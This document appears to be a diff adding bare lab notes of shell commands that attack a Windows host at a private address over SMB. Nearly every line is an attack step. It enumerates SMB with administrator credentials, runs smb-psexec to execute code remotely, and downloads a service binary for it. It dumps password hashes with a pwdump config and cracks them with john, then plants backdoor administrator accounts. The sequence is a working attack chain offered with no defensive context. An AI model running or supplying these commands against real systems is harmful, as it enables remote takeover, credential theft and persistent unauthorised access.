@@ -1,0 +1,25 @@
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-enum-*,smb-os-discovery --script-args smbusername=Administrator,smbpassword=test123 -d
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-psexec --script-args smbusername=Administrator,smbpassword=test123 -d
+
+# cd /usr/local/share/nmap/nselib/data/psexec
+
+# wget https://nmap.org/psexec/nmap_service.exe
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-psexec --script-args smbusername=Administrator,smbpassword=test123 -d
+
+# cat pwdump.lua
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-psexec --script-args smbusername=Administrator,smbpassword=test123,config=pwdump -d
+
+$ gvim hashes.txt
+
+$ john hashes.txt 
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-psexec --script-args smbusername=Administrator,smbpassword=test123,config=backdoor,username=Admin,password=123456 -d
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script smb-psexec --script-args smbusername=Administrator,smbpassword=test123,config=backdoor2,username=Admin -d
+
+# nmap 192.168.1.8 -p445 -T4 -Pn -n --script- smb-enum-users  --script-args smbusername=Administrator,smbpassword=test123
+
